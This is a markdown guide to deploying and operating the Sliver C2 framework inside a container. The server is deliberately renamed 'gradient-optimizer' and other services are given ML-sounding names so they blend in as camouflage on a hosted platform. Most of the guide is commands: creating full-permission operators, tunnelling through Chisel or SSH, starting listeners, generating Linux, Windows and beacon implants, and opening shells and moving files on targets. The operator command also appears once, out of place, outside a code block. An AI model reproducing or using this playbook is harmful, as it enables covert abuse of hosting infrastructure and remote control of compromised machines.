# Reclaiming the Shadows: Utilizing Sliver C2 in the Sanctuary

This guide details how to configure, establish a connection, and interact with the **Sliver C2** framework running within your "Sanctuary" container deployment.

Sliver is a secure, cross-platform Command and Control (C2) framework. In this project's container stack:
* **Sliver Server (`sliver-server`)** runs inside the container, disguised as the background daemon `gradient-optimizer` (`/usr/bin/gradient-optimizer daemon`).
* **Sliver Client (`sliver-client`)** is provided locally as the `./sliver` executable in the root of your workspace.

---

## 🛠️ Architecture Overview

The Sliver C2 ecosystem inside your Sanctuary environment is structured for complete visual camouflage and secure remote access:

| Component | Location | Operational Command / Path | Description |
| :--- | :--- | :--- | :--- |
| **Server Daemon** | Container | `/usr/bin/gradient-optimizer daemon` | Headless mTLS server listening on port `31337`. |
| **Server Console** | Container | `/usr/bin/gradient-optimizer` | Interactive server management (via SSH). |
| **Server Workspace**| Container | `/home/user/.sliver` | Environment storage containing configuration and certs. |
| **Local Client** | Workspace | `./sliver` | Local operator client binary. |
| **Server Logs** | Container | `/home/user/.torch_metrics/sliver.log` | Telemetry logs (accessed via Gradio UI or file system). |

---
SLIVER_ROOT_DIR=/home/user/.sliver /usr/bin/gradient-optimizer operator \
  --name localoperator \
  --lhost 127.0.0.1 \
  --save /home/user/l.cfg \
  --permissions all


## ⚡ Method A: Direct Server Access (Inside SSH)

The simplest way to use Sliver is to launch the interactive server console directly inside the container via SSH.

> [!NOTE]
> This method runs the console inside your remote container terminal. It requires no local client setup or port forwarding beyond the SSH tunnel.

### Step 1: Establish the Tunnel & Connect via SSH
Use the Chisel tunnel to establish the secure remote endpoint and automatically open an SSH session:
```bash
uv run python scripts/cc.py chisel --node <node-name> --ssh
```
*(Alternatively, connect using GOST or Playit tunnel modes as described in [CONTEXT.md](file:///home/trueking/Safe/Proj/Hug/ML/docs/CONTEXT.md)).*

### Step 2: Spawn the Sliver Server Console
Once logged into the container, execute the disguised server binary directly using the specified database directory:
```bash
SLIVER_ROOT_DIR=/home/user/.sliver /usr/bin/gradient-optimizer
```
This will launch the interactive **Sliver Server Console**:
```text
    ██████  ██      ██ ██    ██ ███████ ██████
   ██       ██      ██ ██    ██ ██      ██   ██
   ███████  ██      ██ ██    ██ █████   ██████
        ██  ██      ██  ██  ██  ██      ██   ██
   ███████  ███████ ██   ████   ███████ ██   ██

Sliver C2 v1.7.3 - https://github.com/BishopFox/sliver
[*] Welcome to the sliver shell, type "help" for a list of commands

sliver > 
```

---

## 👥 Method B: Multi-Player Local Client Console (Recommended)

To run the Sliver console interface **on your local machine** using the `./sliver` client executable in your workspace, follow these steps. This is the professional multi-player approach.

### Step 1: Generate an Operator Configuration
While connected to the container via SSH, generate a mutual-TLS operator certificate and config file on the server. Ensure that the `--permissions all` flag is supplied so the configuration allows full C2 control:
```bash
SLIVER_ROOT_DIR=/home/user/.sliver /usr/bin/gradient-optimizer operator \
  --name localoperator \
  --lhost 127.0.0.1 \
  --save /home/user/localoperator.cfg \
  --permissions all
```

### Step 2: Fetch the Configuration File
Download the generated `localoperator.cfg` from `/home/user/` to your local machine.
* **Option A**: Use **Filebrowser** (`ai-metrics-collector`) on local port `9000` (after running `cc.py chisel`).
* **Option B**: Download via `sftp` through the SSH forward port:
  ```bash
  sftp -P 2222 user@127.0.0.1:/home/user/localoperator.cfg ./
  ```
* **Option C**: Retrieve via `scp`:
  ```bash
  scp -P 2222 user@127.0.0.1:/home/user/localoperator.cfg ./localoperator.cfg
  ```

### Step 3: Establish the Tunnel with Sliver mTLS Port Forwarding
Sliver clients communicate over port `31337`. You must map your local port `31337` to the container's loopback port `31337`.

* **If using Chisel (`cc.py`)**: Add the port mapping in the `--remotes` argument:
  ```bash
  uv run python scripts/cc.py chisel --node <node-name> --remotes "1080:socks 2222:127.0.0.1:2222 9000:127.0.0.1:9000 31337:127.0.0.1:31337"
  ```
* **If using standard SSH**: Run a background port forward:
  ```bash
  ssh -N -f -L 31337:127.0.0.1:31337 user@127.0.0.1 -p 2222
  ```

### Step 4: Import and Launch Local Client
In the root of your local workspace, import the configuration and run the console:
```bash
# 1. Import the configuration (only needed once)
./sliver import /path/to/localoperator.cfg

# 2. Launch the client console
./sliver console
```
Your local client will now securely connect to the remote server daemon over the encrypted tunnel!

---

## 📋 Core Sliver Workflows (Cheat Sheet)

Once you are in the sliver console (either local or remote), here are the essential commands:

### 1. Managing Listeners
Listeners wait for incoming connections from generated implants.
```text
sliver > mtls                 # Starts a mutual-TLS listener on port 8888
sliver > http                 # Starts an HTTP listener on port 80
sliver > https                # Starts an HTTPS listener on port 443
sliver > jobs                 # Lists active listeners/jobs
sliver > jobs --kill <id>     # Stops a listener
```

### 2. Generating Implants (Payloads)
Generate an executable payload configured to connect back to your server.
```text
# Generate a Linux session-based implant (connects back over mTLS)
sliver > generate --mtls 127.0.0.1:8888 --os linux --save /home/user/implant_linux

# Generate a Windows session-based implant
sliver > generate --mtls 127.0.0.1:8888 --os windows --save /home/user/implant.exe

# Generate a Beacon implant (asynchronous check-in, more stealthy)
sliver > generate beacon --mtls 127.0.0.1:8888 --os linux --save /home/user/beacon_linux
```

> [!TIP]
> When compiling implants, the server dynamically generates a unique Go binary with embedded cryptographic certificates to authenticate the connection.

### 3. Session Administration
Once the target runs the generated implant, it will connect back and appear in your console.
```text
sliver > sessions                   # List all active sessions
sliver > use <session-id>           # Switch context to interact with a specific session
sliver [active_session] > info      # Retrieve host and system details
sliver [active_session] > shell     # Spawn an interactive shell on the target system
sliver [active_session] > ps        # View running processes
sliver [active_session] > upload /path/to/local /remote/path     # Transfer file to target
sliver [active_session] > download /remote/path /path/to/local   # Retrieve file from target
sliver [active_session] > background                             # Leave session and return to C2 prompt
sliver [active_session] > kill                                   # Terminate the implant session
```
